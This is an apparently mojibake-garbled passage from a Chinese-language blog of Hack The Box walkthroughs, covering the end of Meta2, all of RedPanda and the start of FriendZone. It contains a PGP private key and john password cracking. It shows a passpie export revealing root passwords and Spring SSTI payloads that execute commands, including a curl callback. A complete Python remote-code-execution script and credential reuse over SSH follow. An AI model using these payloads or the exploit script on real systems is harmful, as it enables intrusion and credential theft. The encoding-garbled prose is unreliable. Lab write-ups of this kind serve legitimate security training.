wRi\nuFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J\nCBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT\n+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+\nFZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV\njqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G\nJiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4\nVxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB\nJ2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4\nV9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P\no3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN\n=7Uo6\n-----END PGP PRIVATE KEY BLOCK-----\n```\næ¥ç€å»ç ´è§£ PGP æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# gpg2john keys > gpg.john\n\nFile keys\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt gpg.john   \nUsing default input encoding: UTF-8\nLoaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])\nCost 1 (s2k-count) is 65011712 for all loaded hashes\nCost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes\nCost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nblink182         (Passpie)     \n1g 0:00:00:03 DONE (2022-12-31 14:37) 0.3105g/s 50.93p/s 50.93c/s 50.93C/s ginger..blink182\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n```\nå¾—åˆ°äº†ä¸€ä¸ªå¯†ç  blink182\n\nä½¿ç”¨æˆ‘ä»¬çš„å¯†ç å»å¯¼å‡º passpie çš„å¯†ç \n\n```bash\njnelson@meta2:~/.passpie$ passpie list\nâ•’â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â•â•¤â•â•â•â•â•â•â•â•â•â•â•â••\nâ”‚ Name   â”‚ Login   â”‚ Password   â”‚ Comment   â”‚\nâ•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•â•ªâ•â•â•â•â•â•â•â•â•â•â•â•¡\nâ”‚ ssh    â”‚ jnelson â”‚ ********   â”‚           â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚ ssh    â”‚ root    â”‚ ********   â”‚           â”‚\nâ•˜â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•â•§â•â•â•â•â•â•â•â•â•â•â•â•›\njnelson@meta2:~/.passpie$ cd ../\njnelson@meta2:~$ touch pass\njnelson@meta2:~$ passpie export pass\nPassphrase: \njnelson@meta2:~$ cat pass\ncredentials:\n- comment: ''\n  fullname: root@ssh\n  login: root\n  modified: 2022-06-26 08:58:15.621572\n  name: ssh\n  password: !!python/unicode 'p7qfAZt4_A1xo_0x'\n- comment: ''\n  fullname: jnelson@ssh\n  login: jnelson\n  modified: 2022-06-26 08:58:15.514422\n  name: ssh\n  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'\nhandler: passpie\nversion: 1.0\n```\nå¾—åˆ°äº† root è´¦æˆ·çš„å¯†ç \n\n```bash\nusername = root\npassword = p7qfAZt4_A1xo_0x\n```\nå»åˆ‡æ¢åˆ° root ç”¨æˆ·\n\n```bash\njnelson@meta2:~$ su root\nPassword: \nroot@meta2:/home/jnelson# whoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\nå¾—åˆ°äº† root æƒé™\n\n```bash\nroot@meta2:/home/jnelson# cat /root/root.txt\n8af8be1e265388ed685c674d029175ca\n```\nå¾—åˆ°äº† root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"RedPanda - Hackthebox - æœªåšææƒ","url":"/2022/10/24/Hackthebox/Easy/Hackthebox-RedPanda/","content":"\n# Hackthebox - RedPanda\n# é¶åœºä¿¡æ¯\n![](Hackthebox-RedPanda/8adaa92c-602e-42fe-a8fa-e1863d6e2ae5.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-RedPanda/45267983-d5ed-40f3-bef8-d71fa254d799.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nnmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.170\n\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-23 09:15 CST\nNmap scan report for 10.10.11.170\nHost is up (0.41s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n8080/tcp open  http-proxy\n| fingerprint-strings:\n|   GetRequest:\n|     HTTP/1.1 200\n|     Content-Type: text/html;charset=UTF-8\n|     Content-Language: en-US\n|     Date: Sun, 23 Oct 2022 01:16:00 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\" dir=\"ltr\">\n|     <head>\n|     <meta charset=\"utf-8\">\n|     <meta author=\"wooden_k\">\n|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->\n|     <link rel=\"stylesheet\" href=\"css/panda.css\" type=\"text/css\">\n|     <link rel=\"stylesheet\" href=\"css/main.css\" type=\"text/css\">\n|     <title>Red Panda Search | Made with Spring Boot</title>\n|     </head>\n|     <body>\n|     <div class='pande'>\n|     <div class='ear left'></div>\n|     <div class='ear right'></div>\n|     <div class='whiskers left'>\n|     <span></span>\n|     <span></span>\n|     <span></span>\n|     </div>\n|     <div class='whiskers right'>\n|     <span></span>\n|     <span></span>\n|     <span></span>\n|     </div>\n|     <div class='face'>\n|     <div class='eye\n|   HTTPOptions:\n|     HTTP/1.1 200\n|     Allow: GET,HEAD,OPTIONS\n|     Content-Length: 0\n|     Date: Sun, 23 Oct 2022 01:16:01 GMT\n|     Connection: close\n|   RTSPRequest:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 23 Oct 2022 01:16:02 GMT\n|     Connection: close\n|     <!doctype html><html lang=\"en\"><head><title>HTTP Status 400\n|     Request</title><style type=\"text/css\">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-title: Red Panda Search | Made with Spring Boot\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.92%I=7%D=10/23%Time=635495D0%P=arm-apple-darwin21.5.0%\nSF:r(GetRequest,690,\"HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;ch\nSF:arset=UTF-8\\r\\nContent-Language:\\x20en-US\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\nSF:\\x202022\\x2001:16:00\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x2\nSF:0html>\\n<html\\x20lang=\\\"en\\\"\\x20dir=\\\"ltr\\\">\\n\\x20\\x20<head>\\n\\x20\\x20\\\nSF:x20\\x20<meta\\x20charset=\\\"utf-8\\\">\\n\\x20\\x20\\x20\\x20<meta\\x20author=\\\"w\nSF:ooden_k\\\">\\n\\x20\\x20\\x20\\x20<!--Codepen\\x20by\\x20khr2003:\\x20https://co\nSF:depen\\.io/khr2003/pen/BGZdXw\\x20-->\\n\\x20\\x20\\x20\\x20<link\\x20rel=\\\"sty\nSF:lesheet\\\"\\x20href=\\\"css/panda\\.css\\\"\\x20type=\\\"text/css\\\">\\n\\x20\\x20\\x2\nSF:0\\x20<link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"css/main\\.css\\\"\\x20type=\\\"te\nSF:xt/css\\\">\\n\\x20\\x20\\x20\\x20<title>Red\\x20Panda\\x20Search\\x20\\|\\x20Made\\\nSF:x20with\\x20Spring\\x20Boot</title>\\n\\x20\\x20</head>\\n\\x20\\x20<body>\\n\\n\\\nSF:x20\\x20\\x20\\x20<div\\x20class='pande'>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20\nSF:class='ear\\x20left'></div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='ear\\\nSF:x20right'></div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='whiskers\\x20le\nSF:ft'>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20</div>\\n\\x20\\x20\\x\nSF:20\\x20\\x20\\x20<div\\x20class='whiskers\\x20right'>\\n\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\nSF:\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20<span></span>\\n\\x20\\x20\\x20\\x20\\x20\\x\nSF:20</div>\\n\\x20\\x20\\x20\\x20\\x20\\x20<div\\x20class='face'>\\n\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20<div\\x20class='eye\")%r(HTTPOptions,75,\"HTTP/1\\.1\\x202\nSF:00\\x20\\r\\nAllow:\\x20GET,HEAD,OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x\nSF:20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:01\\x20GMT\\r\\nConnection:\\x20close\\\nSF:r\\n\\r\\n\")%r(RTSPRequest,24E,\"HTTP/1\\.1\\x20400\\x20\\r\\nContent-Type:\\x20t\nSF:ext/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x2\nSF:0435\\r\\nDate:\\x20Sun,\\x2023\\x20Oct\\x202022\\x2001:16:02\\x20GMT\\r\\nConnec\nSF:tion:\\x20close\\r\\n\\r\\n<!doctype\\x20html><html\\x20lang=\\\"en\\\"><head><tit\nSF:le>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request</title><styl\nSF:e\\x20type=\\\"text/css\\\">body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x\nSF:20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20\nSF:h1\\x20{font-size:22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:\nSF:14px;}\\x20p\\x20{font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{h\nSF:eight:1px;background-color:#525D76;border:none;}</style></head><body><h\nSF:1>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20Request</h1></body></\nSF:html>\");\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.92%E=4%D=10/23%OT=22%CT=1%CU=40350%PV=Y%DS=2%DC=T%G=Y%TM=635496\nOS:14%P=arm-apple-darwin21.5.0)SEQ(SP=103%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A\nOS:)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M53\nOS:9ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88\nOS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+\nOS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)\nOS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A\nOS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D\nOS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4\nOS:0%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 3306/tcp)\nHOP RTT       ADDRESS\n1   537.83 ms 10.10.14.1\n2   537.94 ms 10.10.11.170\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 93.28 seconds\n```\n## Http\n![](Hackthebox-RedPanda/a7ebd7aa-1c3b-4c70-b6c9-63ce5956683f.png)\n\næŒºå¯çˆ±ä¸€å°ç†ŠçŒ«ï¼Œè¿˜ä¼šçœ¨çœ¼ç›\n\nåœ¨ä¸‹é¢æœ‰ä¸ªæœç´¢æ¡†ï¼Œéšä¾¿æœç‚¹ä¸œè¥¿çœ‹çœ‹\n\n![](Hackthebox-RedPanda/6f01e1b9-e0a8-4fc6-8c28-438269d664bb.png)\n\nçœ‹ç€äº¤äº’ç•Œé¢ï¼Œç¡®å®ä¼šå»æ•°æ®åº“è¿›è¡Œäº¤äº’æŸ¥è¯¢ï¼Œè¿™ç§æ½œæ„è¯†å°±è§‰å¾—å¯èƒ½ä¼šæœ‰æ³¨å…¥\n\næ²¡æµ‹è¯•å‡ºä»€ä¹ˆä¸œè¥¿ï¼Œå» fuzz è¯•è¯•å§\n\n## Fuzz\n```bash\n lucifiel@MacBookPro î‚° ~ î‚° ffuf -u 'http://10.10.11.170:8080/FUZZ' -w /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 200\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.5.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.170:8080/FUZZ\n :: Wordlist         : FUZZ: /Users/lucifiel/Documents/Penetration/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 200\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\nstats                   [Status: 200, Size: 987, Words: 200, Lines: 33, Duration: 619ms]\nerror                   [Status: 500, Size: 86, Words: 1, Lines: 1, Duration: 617ms]\nsearch                  [Status: 405, Size: 117, Words: 3, Lines: 1, Duration: 616ms]\n                        [Status: 200, Size: 1543, Words: 368, Lines: 56, Duration: 401ms]\n:: Progress: [30000/30000] :: Job [1/1] :: 8724 req/sec :: Duration: [0:00:41] :: Errors: 10271 ::\n```\næœ‰ä¸€ä¸ª stats ç›®å½•ï¼Œå»çœ‹ä¸€ä¸‹\n\n![](Hackthebox-RedPanda/2c7be7c5-fe4a-4b5d-881d-22eeb5ba5b62.png)\n\n![](Hackthebox-RedPanda/540af504-b13c-4b6a-a98b-d6a92002d03d.png)\n\nè¿™è¾¹å‘ç°äº†ä¸€äº›å›¾ç‰‡ï¼Œå»å°è¯•è¯»å–è¯•è¯•\n\n![](Hackthebox-RedPanda/44829a99-86a7-4024-aec1-c6e32b78076e.png)\n\nè¿™é‡Œæç¤ºç¡®å®æ˜¯æœ‰æ³¨å…¥çš„ï¼Œä¸è¿‡æœ‰ä¸€è¯´ä¸€ï¼Œè¿™å›¾ç‰‡ç¡®å®æŒºæœ‰æ„æ€çš„\n\nä¸è¿‡æ—¢ç„¶ sql æ³¨å…¥ä¸è¡Œï¼Œé‚£å°±è¯•è¯• ssti å‘—ï¼Œåæ­£å¯ä»¥ç¡®å®šæ¼æ´åœ¨äºæ³¨å…¥äº†\n\n![](Hackthebox-RedPanda/fe9949f6-3343-42b1-9040-d1fbf4faefbb.png)\n\næµ‹è¯•å‡ºæ¥äº† è¯­æ³•æ˜¯ \\*{7\\*7}ï¼ŒæŠŠ ssti è¯­å¥ä¸­çš„ \\$ æ›¿æ¢ä¸º \\* å³å¯ç»•è¿‡\n\n# æ¼æ´åˆ©ç”¨\næˆ‘ä»¬é€šè¿‡ nmap çš„æ‰«æç»“æœå¯å¾—çŸ¥ï¼Œè¿™ä¸ªç½‘ç«™ä½¿ç”¨çš„æ˜¯ Spring Bootï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šæ˜¯ä¸€ä¸ª java çš„ç¨‹åº\n\næ‰€ä»¥æˆ‘ä»¬å» ssti çš„åˆ©ç”¨è¯­å¥é‡Œæ‰¾ä¸€ä¸‹\n\n> [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)\n\n```bash\n*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}\n```\n```bash\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nsshd:x:111:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nusbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nwoodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash\nmysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false\n```\næˆåŠŸè¯»å–åˆ° /etc/passwd æ–‡ä»¶\n\nè™½ç„¶å¯ä»¥äº†ï¼Œä½†æ˜¯è½¬æ¢æ ¼å¼è¿˜æ˜¯æœ‰ç‚¹éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘åˆæ‰¾åˆ°äº†ä¸€ç¯‡æ–‡ç« \n\n> [https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/el-expression-language.md)\n\n```bash\n*{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"whoami\")}\n```\n![](Hackthebox-RedPanda/67d0bdba-da91-4208-ab6f-879ed82d7b3f.png)\n\nç›´æ¥æ‰§è¡Œä¼¼ä¹ä¼šæç¤ºé”™è¯¯ï¼Œå»å¼€ä¸€ä¸ª http æœåŠ¡è¯•è¯•\n\n```bash\npython3 -m http.server 80\n```\nç„¶åæ”¹ä¸€ä¸‹æŒ‡ä»¤ï¼Œæ¥è¯·æ±‚è¯•è¯•\n\n```bash\n*{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"curl http://10.10.14.2\")}\n```\n```bash\n lucifiel@MacBookPro î‚° ~ î‚° python3 -m http.server 80\nServing HTTP on :: port 80 (http://[::]:80/) ...\n::ffff:10.10.11.170 - - [23/Oct/2022 10:02:07] \"GET / HTTP/1.1\" 200 -\n```\nç›´æ¥æä¸ª rce è„šæœ¬å§\n\n```python\n#!/usr/bin/python3\nimport requests\nfrom cmd import Cmd\nfrom bs4 import BeautifulSoup\n\n\nprint(\"\"\"\n __          __    __       ______     __      _______     __      _______     __      \n|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |     \n|  |        |  |  |  |    |  ,----'   |  |    |  |__      |  |    |  |__      |  |     \n|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |     \n|  `----.   |  `--'  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.\n|_______|    \\______/      \\______|   |__|    |__|        |__|    |_______|   |_______|\n\n\"\"\")\nclass RCE(Cmd):\n    prompt = \"\\033[1;31m$\\033[1;37m \"\n    def decimal(self, args):\n        comando = args\n        decimales = []\n\n        for i in comando:\n            decimales.append(str(ord(i)))\n        payload = \"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)\" % decimales[0]\n\n        for i in decimales[1:]:\n            payload += \".concat(T(java.lang.Character).toString({}))\".format(i)\n\n        payload += \").getInputStream())}\"\n        data = { \"name\": payload }\n        requer = requests.post(\"http://10.10.11.170:8080/search\", data=data)\n        parser = BeautifulSoup(requer.content, 'html.parser')\n        grepcm = parser.find_all(\"h2\")[0].get_text()\n        result = grepcm.replace('You searched for:','').strip()\n        print(result)\n\n    def default(self, args):\n        try:\n            self.decimal(args)\n        except:\n            print(\"%s: command not found\" % (args))\n\nRCE().cmdloop()\n```\n```bash\n lucifiel@MacBookPro î‚° ~/Desktop î‚° python3 exploip.py\n\n __          __    __       ______     __      _______     __      _______     __\n|  |        |  |  |  |     /      |   |  |    |   ____|   |  |    |   ____|   |  |\n|  |        |  |  |  |    |  ,----'   |  |    |  |__      |  |    |  |__      |  |\n|  |        |  |  |  |    |  |        |  |    |   __|     |  |    |   __|     |  |\n|  `----.   |  `--'  |    |  `----.   |  |    |  |        |  |    |  |____    |  `----.\n|_______|    \\______/      \\______|   |__|    |__|        |__|    |_______|   |_______|\n\n\n$ whoami\nwoodenk\n$ id\nuid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)\n```\nå¯ä»¥æˆåŠŸæ‰§è¡Œï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰ shell æ–¹ä¾¿ï¼Œå…ˆå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ‹¿åˆ° shell çš„ä¸œè¥¿å§\n\nåœ¨æ–‡ä»¶ `/opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java` ä¸­ï¼Œæ‰¾åˆ°äº†ä¸€æ®µå‡­è¯\n\n```bash\nconn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\");\n```\n```bash\nusername = woodenk\npassword = RedPandazRule\n```\n```bash\n lucifiel@MacBookPro î‚° ~/Desktop î‚° ssh woodenk@10.10.11.170\nwoodenk@10.10.11.170's password:\nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Mon 24 Oct 2022 03:15:10 AM UTC\n\n  System load:           0.02\n  Usage of /:            80.9% of 4.30GB\n  Memory usage:          41%\n  Swap usage:            0%\n  Processes:             213\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.170\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:1c2\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Mon Oct 24 03:14:58 2022 from 10.10.14.11\nwoodenk@redpanda:~$ whoami&&id\nwoodenk\nuid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ shell\n\n```bash\nwoodenk@redpanda:~$ cat user.txt\na00d4342cd040f667d3dbfee34a49451\n```\næˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶\n","tags":["Hackthebox"]},{"title":"FriendZone - Hackthebox","url":"/2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/","content":"\n# Hackthebox - FriendZone\n# é¶åœºä¿¡æ¯\n![](Hackthebox-FriendZone/1685a985-17e0-44e9-bd04-a66535d31e57.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-FriendZone/b0a91def-39ba-4606-a732-8ed9239ee972.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿lucifiel)-[~/Desktop]\nâ””â”€# nmap -sS -sC -sV -A -p- --min-rate 5000 10.10.10.123\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 13:14 CST\nNmap scan report for 10.10.10.123\nHost is up (0.27s latency).\nNot shown: 65528 closed tcp ports (reset)\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 3.0.3\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)\n|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)\n|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)\n53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)\n| dns-nsid: \n|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Friend Zone Escape software\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n443/tcp open  ssl/http    